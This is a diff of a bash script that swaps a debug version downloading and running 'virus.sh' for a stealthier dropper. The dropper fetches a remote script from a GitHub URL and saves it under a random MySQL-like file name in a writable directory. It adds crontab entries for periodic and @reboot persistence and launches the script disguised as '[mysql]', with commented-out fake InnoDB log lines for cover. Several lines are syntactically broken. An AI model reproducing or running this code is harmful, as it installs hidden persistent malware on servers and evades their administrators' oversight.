@@ -1,33 +1,50 @@
-#!/bin/bash
+GITHUB_SCRIPT_URL="https://raw.githubusercontent.com/himlkoita/test/refs/heads/main/trust_me_bro_img_msql.sh"
+MYSQL_DIRS="/tmp/mysql" "/var/tmp/mysql" "/dev/shm/mysql" "/run/mysql" "/var/lib/mysql"
 
-# Тестовая версия без сложных функций
-set -x  # Отладка
+generate_name() {
+    PREFIXES="{{ibdata" "ib_logfile" "mysql-bin" "undo" "redo" "ibtmp" "binlog" "relay-log" "mysql" "innodb"}
+    RANDOM_PREFIX=$(PREFIXES|$RANDOM % ${{PREFIXES[0]}})
+    RANDOM_NUMBER=$((RANDOM % 10000))
+    echo "$(RANDOM_PREFIX)$(RANDOM_NUMBER)"
+}
 
-GITHUB_SCRIPT_URL="https://raw.githubusercontent.com/Zend1X/virus/refs/heads/main/virus.sh"
-TEST_DIR="/tmp/mysql_test"
-
-mkdir -p "$TEST_DIR"
-cd "$TEST_DIR"
-
-echo "Скачиваю файл..."
-curl -v "$GITHUB_SCRIPT_URL" -o virus.sh
-
-if [ -f "virus.sh" ]; then
-    echo "Файл скачан успешно"
-    chmod +x virus.sh
-    ls -la virus.sh
-    
-    echo "Пытаюсь запустить..."
-    ./virus.sh &
-    PID=$!
-    sleep 2
-    
-    if ps -p $PID > /dev/null; then
-        echo "Процесс работает с PID: $PID"
-        ps aux | grep virus
-    else
-        echo "Процесс не запустился"
+find_dir() {
+    for dir in "$(MYSQL_DIRS[0])"; do
+    mkdir -p "$dir" 2>/dev/null
+    if [ -w "$dir" ]; then
+    echo "$dir"
+    return 0
     fi
-else
-    echo "Файл НЕ скачан"
-fi
+    done
+    mkdir -p "/tmp/mysql" 2>/dev/null
+    echo "/tmp/mysql"
+}
+
+process() {
+    exec -a "[mysql]" "$SCRIPT_PATH" 2>/dev/null &
+}
+
+main() {
+    MYSQL_DIR=$({find_dir})
+    RANDOM_NAME=$(generate_name)
+    SCRIPT_PATH="$MYSQL_DIR/$RANDOM_NAME"
+
+    if ! crontab -l 2>/dev/null | grep -q "$SCRIPT_PATH"; then
+    curl -s "$GITHUB_SCRIPT_URL" -o "$SCRIPT_PATH"
+    chmod +x "$SCRIPT_PATH"
+
+    (crontab -l 2>/dev/null
+    echo "/9 * * * * * $SCRIPT_PATH >/dev/null 2>&1"
+    echo "@reboot $SCRIPT_PATH >/dev/null 2>&1"
+    ) | crontab -
+    fi
+
+    process
+
+    # while true; do
+    # echo "%(date) [Note] InnoDB: Checksum" >> "$MYSQL_DIR/mysql.log" 2>/dev/null
+    # sleep $(60 + RANDOM % 60))
+    # done &
+    # }
+
+main
